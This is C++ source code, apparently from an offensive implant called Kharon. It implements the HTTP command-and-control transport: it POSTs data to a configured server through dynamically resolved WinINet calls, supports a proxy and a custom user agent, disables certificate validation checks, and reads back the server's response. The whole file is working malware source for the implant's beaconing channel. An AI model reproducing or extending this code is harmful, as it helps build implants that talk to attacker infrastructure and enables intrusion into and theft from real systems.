#include <Kharon.h>

using namespace Root;

#if PROFILE_C2 == PROFILE_WEB
auto DECLFN Transport::WebSend(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
    HANDLE hSession = NULL;
    HANDLE hConnect = NULL;
    HANDLE hRequest = NULL;

    ULONG  HttpAccessType  = 0;
    ULONG  HttpFlags       = 0;
    ULONG  OptFlags        = 0;

    BOOL   Success = FALSE;

    PVOID  TmpBuffer     = NULL;
    PVOID  RespBuffer    = NULL;
    SIZE_T RespSize      = 0;
    DWORD  BytesRead     = 0;
    UINT32 ContentLength = 0;
    ULONG  ContentLenLen = sizeof(ContentLength);

    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof(HttpStatusCode);

    HttpFlags = INTERNET_FLAG_RELOAD;

    if (Self->Tsp->Web.ProxyEnabled)
        HttpAccessType = INTERNET_OPEN_TYPE_PROXY;

    hSession = Self->Wininet.InternetOpenW(
        Self->Tsp->Web.UserAgent, HttpAccessType,
        Self->Tsp->Web.ProxyUrl, 0, 0
    );
    if (!hSession) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    hConnect = Self->Wininet.InternetConnectW(
        hSession, Self->Tsp->Web.Host, Self->Tsp->Web.Port,
        Self->Tsp->Web.ProxyUsername, Self->Tsp->Web.ProxyPassword,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    if (Self->Tsp->Web.Secure) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_WRONG_USAGE |
                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }

    hRequest = Self->Wininet.HttpOpenRequestW(
        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL,
        NULL, NULL, HttpFlags, 0
    );
    if (!hRequest) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    Self->Wininet.InternetSetOptionW(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof(OptFlags));

    Success = Self->Wininet.HttpSendRequestW(
        hRequest, Self->Tsp->Web.HttpHeaders,
        Str::LengthW(Self->Tsp->Web.HttpHeaders),
        Data, Size
    );
    if (!Success) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    Self->Wininet.HttpQueryInfoW(
        hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, NULL
    );

    KhDbg("http status code %d", HttpStatusCode);

    Success = Self->Wininet.HttpQueryInfoW(
        hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
        &ContentLength, &ContentLenLen, NULL
    );

    if (!Success && KhGetError == 12150) {
        KhDbg("content-length header not found");
        Success = TRUE;
    } else if ( ! Success ) {
        KhDbg("last error: %d", KhGetError);
        goto _KH_END;
    }

    RespSize = ContentLength;

    if (RespSize) {
        RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1));
        if (!RespBuffer) goto _KH_END;

        Success = Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
        if (!Success) goto _KH_END;
    } else {
        RespSize = 0;
        RespBuffer = NULL;
        TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
        if (!TmpBuffer) goto _KH_END;

        do {
            Success = Self->Wininet.InternetReadFile(hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead);
            if (!Success || BytesRead == 0) break;

            RespSize += BytesRead;

            if (!RespBuffer) {
                RespBuffer = PTR(Self->Hp->Alloc(RespSize));
                if (!RespBuffer) goto _KH_END;
            } else {
                RespBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, RespSize));
                if (!RespBuffer) goto _KH_END;
            }

            Mem::Copy(PTR(U_PTR(RespBuffer) + (RespSize - BytesRead)), TmpBuffer, BytesRead);
            Mem::Zero(U_PTR(TmpBuffer), BytesRead);
        } while (BytesRead > 0);

        if (TmpBuffer) {
            Self->Hp->Free(TmpBuffer);
            TmpBuffer = NULL;
        }
    }

    if (RespBuffer && RecvData) *RecvData = RespBuffer;
    if (RecvSize) *RecvSize = RespSize;

    Success = TRUE;

_KH_END:
    if (!Success && RespBuffer) {
        Self->Hp->Free(RespBuffer);
        RespBuffer = NULL;
    }

    if (TmpBuffer)
        Self->Hp->Free(TmpBuffer);

    if (hRequest) Self->Wininet.InternetCloseHandle(hRequest);
    if (hConnect) Self->Wininet.InternetCloseHandle(hConnect);
    if (hSession) Self->Wininet.InternetCloseHandle(hSession);

    return Success;
}
#endif
